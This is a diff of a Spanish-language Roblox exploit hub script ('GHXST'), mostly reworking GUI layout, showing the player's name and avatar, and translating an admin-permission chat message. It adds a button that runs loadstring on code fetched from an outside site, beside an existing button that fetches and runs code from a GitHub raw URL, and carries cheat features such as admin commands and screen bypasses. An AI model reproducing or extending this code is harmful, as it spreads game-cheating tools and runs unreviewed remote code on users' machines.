 FirstPage.BorderColor3 = Color3.fromRGB(0, 0, 0)
 FirstPage.BorderSizePixel = 3
-FirstPage.Position = UDim2.new(-0.00123958779, 0, 0.0152167724, 0)
-FirstPage.Size = UDim2.new(0, 267, 0, 271)
+FirstPage.Position = UDim2.new(-0.00123958779, 0, 0, 0)
+FirstPage.Size = UDim2.new(0, 267, 0, 294)
 
-Title.Name = "Title"
-Title.Parent = FirstPage
-Title.BackgroundColor3 = Color3.fromRGB(11, 11, 18)
-Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Title.Position = UDim2.new(0.0413346291, 0, 0.013333505, 0)
-Title.Size = UDim2.new(0, 242, 0, 27)
-Title.Font = Enum.Font.SciFi
-Title.Text = "GHXST"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextScaled = true
-Title.TextSize = 28.000
-Title.TextWrapped = true
+PlayerName.Name = "PlayerName"
+PlayerName.Parent = FirstPage
+PlayerName.BackgroundColor3 = Color3.fromRGB(11, 11, 18)
+PlayerName.BorderColor3 = Color3.fromRGB(0, 0, 0)
+PlayerName.Position = UDim2.new(0.0489283055, 0, 0.0214415509, 0)
+PlayerName.Size = UDim2.new(0, 242, 0, 42)
+PlayerName.Font = Enum.Font.SciFi
+PlayerName.Text = "GHXST"
+PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
+PlayerName.TextSize = 28.000
 
 SCORPION.Name = "SCORPION"
 SCORPION.Parent = FirstPage
 SCORPION.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 SCORPION.BorderColor3 = Color3.fromRGB(0, 0, 0)
-SCORPION.Position = UDim2.new(0.0456096046, 0, 0.869084775, 0)
+SCORPION.Position = UDim2.new(0.217835188, 0, 0.788795829, 0)
 SCORPION.Size = UDim2.new(0, 74, 0, 25)
 SCORPION.Font = Enum.Font.SourceSans
 SCORPION.Text = "SCORPION"
@@ -18848,7 +18929,7 @@ SCORPION.MouseButton1Down:connect(function()
 				admins[player.UserId] = {
 					settings = {prefix = prefix } 
 				}
-				chat(player.Name..", ahora eres todo un dios. Ahora "..prefix.."pon cmds para ver la lista de comandos.")
+				chat(player.Name..", Obtenistes permisos. Tipo "..prefix.."pon cmds para ver la lista de comandos. Favor de leerlo  Traducido por Adon")
 			end
 			notify(arg1:sub(2,2):upper()..arg1:sub(3).."ed "..GetPlayerFromString(arg2)..".")
 		end
@@ -19405,19 +19486,19 @@ SCORPION.MouseButton1Down:connect(function()
 	print("Edited and fixed for by adon :)") 
 end)
 
-Subtitle.Name = "Subtitle"
-Subtitle.Parent = FirstPage
-Subtitle.BackgroundColor3 = Color3.fromRGB(11, 11, 18)
-Subtitle.BackgroundTransparency = 1.000
-Subtitle.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Subtitle.BorderSizePixel = 0
-Subtitle.Position = UDim2.new(0.114134677, 0, 0.0977683663, 0)
-Subtitle.Size = UDim2.new(0, 203, 0, 27)
-Subtitle.Font = Enum.Font.RobotoMono
-Subtitle.Text = "BIENVENIDO"
-Subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-Subtitle.TextSize = 16.000
-Subtitle.TextWrapped = true
+Subtitle_4.Name = "Subtitle"
+Subtitle_4.Parent = FirstPage
+Subtitle_4.BackgroundColor3 = Color3.fromRGB(11, 11, 18)
+Subtitle_4.BackgroundTransparency = 1.000
+Subtitle_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Subtitle_4.BorderSizePixel = 0
+Subtitle_4.Position = UDim2.new(0.121625423, 0, 0.159125403, 0)
+Subtitle_4.Size = UDim2.new(0, 203, 0, 27)
+Subtitle_4.Font = Enum.Font.RobotoMono
+Subtitle_4.Text = "BIENVENIDO"
+Subtitle_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+Subtitle_4.TextSize = 16.000
+Subtitle_4.TextWrapped = true
 
 Text_x.Name = "Text_x"
 Text_x.Parent = FirstPage
@@ -19425,7 +19506,7 @@ Text_x.BackgroundColor3 = Color3.fromRGB(11, 11, 18)
 Text_x.BackgroundTransparency = 1.000
 Text_x.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Text_x.BorderSizePixel = 0
-Text_x.Position = UDim2.new(0.114134677, 0, 0.769775152, 0)
+Text_x.Position = UDim2.new(0.106644049, 0, 0.697921395, 0)
 Text_x.Size = UDim2.new(0, 203, 0, 27)
 Text_x.Font = Enum.Font.RobotoMono
 Text_x.Text = "CARGAR SCRIPTS"
@@ -19433,21 +19514,11 @@ Text_x.TextColor3 = Color3.fromRGB(255, 255, 255)
 Text_x.TextSize = 16.000
 Text_x.TextWrapped = true
 
-MainImage.Name = "MainImage"
-MainImage.Parent = FirstPage
-MainImage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-MainImage.BackgroundTransparency = 1.000
-MainImage.BorderColor3 = Color3.fromRGB(0, 0, 0)
-MainImage.BorderSizePixel = 0
-MainImage.Position = UDim2.new(0.271756589, 0, 0.289289564, 0)
-MainImage.Size = UDim2.new(0, 120, 0, 120)
-MainImage.Image = "http://www.roblox.com/asset/?id=1839014177"
-
 MOSCANEW.Name = "MOSCA NEW"
 MOSCANEW.Parent = FirstPage
 MOSCANEW.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 MOSCANEW.BorderColor3 = Color3.fromRGB(0, 0, 0)
-MOSCANEW.Position = UDim2.new(0.674823046, 0, 0.865394711, 0)
+MOSCANEW.Position = UDim2.new(0.498793125, 0, 0.873756349, 0)
 MOSCANEW.Size = UDim2.new(0, 74, 0, 25)
 MOSCANEW.Font = Enum.Font.SourceSans
 MOSCANEW.Text = "MOSCA NEW"
@@ -19462,7 +19533,7 @@ MOSCAOLD.Name = "MOSCA OLD"
 MOSCAOLD.Parent = FirstPage
 MOSCAOLD.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 MOSCAOLD.BorderColor3 = Color3.fromRGB(0, 0, 0)
-MOSCAOLD.Position = UDim2.new(0.36021629, 0, 0.865394711, 0)
+MOSCAOLD.Position = UDim2.new(0.217894554, 0, 0.873756349, 0)
 MOSCAOLD.Size = UDim2.new(0, 74, 0, 25)
 MOSCAOLD.Font = Enum.Font.SourceSans
 MOSCAOLD.Text = "MOSCA OLD"
@@ -19472,13 +19543,65 @@ MOSCAOLD.MouseButton1Down:connect(function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Julianitocuatro/ddasdw/main/xdxdxd",true))();
 end)
 
+PlayerImage.Name = "PlayerImage"
+PlayerImage.Parent = FirstPage
+PlayerImage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+PlayerImage.BackgroundTransparency = 1.000
+PlayerImage.BorderSizePixel = 0
+PlayerImage.Position = UDim2.new(0.292134821, 0, 0.282653123, 0)
+PlayerImage.Size = UDim2.new(0, 110, 0, 110)
+PlayerImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
+
+SCORPIONBL.Name = "SCORPIONBL"
+SCORPIONBL.Parent = FirstPage
+SCORPIONBL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+SCORPIONBL.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SCORPIONBL.Position = UDim2.new(0.498835325, 0, 0.788795829, 0)
+SCORPIONBL.Size = UDim2.new(0, 74, 0, 25)
+SCORPIONBL.Font = Enum.Font.SourceSans
+SCORPIONBL.Text = "SCORPIONB"
+SCORPIONBL.TextColor3 = Color3.fromRGB(255, 255, 255)
+SCORPIONBL.TextSize = 14.000
+SCORPIONBL.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://www.scorpionadm.in/script'))()
+end)
+
 -- Scripts:
 
-local function TEVNZQG_fake_script() -- HAXE_2.Open 
+local function IBBMNC_fake_script() -- FirstPage.ImageRBLX 
+	local script = Instance.new('LocalScript', FirstPage)
+
+	local frame = script.Parent
+	
+	
+	
+	local player = game.Players.LocalPlayer
+	
+	
+	
+	local userId = player.UserId
+	
+	local thumbType = Enum.ThumbnailType.HeadShot
+	
+	local thumbSize = Enum.ThumbnailSize.Size420x420
+	
+	local content, isReady = game.Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+	
+	
+	
+	
+	
+	frame.PlayerImage.Image = content
+	
+	frame.PlayerName.Text = player.Name
+	
+end
+coroutine.wrap(IBBMNC_fake_script)()
+local function HNWOMCU_fake_script() -- HAXE_2.Open 
 	local script = Instance.new('LocalScript', HAXE_2)
 
 	player = game.Players.LocalPlayer
-
+	
 	player:GetMouse().KeyDown:Connect(function(key)
 		if key == "q" and script.Parent.Visible == false then
 			script.Parent.Visible = true
@@ -19488,21 +19611,21 @@ local function TEVNZQG_fake_script() -- HAXE_2.Open
 			end
 		end
 	end)
-
-
+	
+	
 end
-coroutine.wrap(TEVNZQG_fake_script)()
-local function CJMOM_fake_script() -- HAXE_2.BlackScreen 
+coroutine.wrap(HNWOMCU_fake_script)()
+local function BDTYRR_fake_script() -- HAXE_2.BlackScreen 
 	local script = Instance.new('LocalScript', HAXE_2)
 
-
+	
 	while true do
 		wait()
 		local Gui = game:GetService("StarterGui")
 		local Player = game:GetService("Players").LocalPlayer
 		local Camera = workspace.CurrentCamera 
-
-
+	
+	
 		Player.PlayerGui.Home.intro.Visible = false 
 		Player.PlayerGui.Home.fadeFrame.Visible = false 
 		Camera.CameraType = Enum.CameraType.Custom 
@@ -19510,8 +19633,8 @@ local function CJMOM_fake_script() -- HAXE_2.BlackScreen
 		Gui:SetCoreGuiEnabled(Enum.CoreGuiType.All,true)
 	end
 end
-coroutine.wrap(CJMOM_fake_script)()
-local function VSGO_fake_script() -- HAXE_2.NotShield 
+coroutine.wrap(BDTYRR_fake_script)()
+local function MLAIDV_fake_script() -- HAXE_2.NotShield 
 	local script = Instance.new('LocalScript', HAXE_2)
 
 	game:GetService("UserInputService").InputBegan:connect(function(inputObject, gameProcessedEvent)
@@ -19530,4 +19653,4 @@ local function VSGO_fake_script() -- HAXE_2.NotShield
 		end
 	end)
 end
-coroutine.wrap(VSGO_fake_script)()
+coroutine.wrap(MLAIDV_fake_script)()
